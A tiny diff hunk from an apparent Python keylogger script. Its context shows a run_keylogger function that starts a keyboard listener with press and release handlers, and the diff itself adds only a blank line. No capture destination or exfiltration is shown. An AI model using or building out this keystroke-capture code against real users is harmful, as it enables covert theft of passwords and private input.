@@ -224,6 +224,7 @@ def run_keylogger():
     listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
     listener.start()
     return listener
+    
 
 # === Main ===
 if __name__ == '__main__':
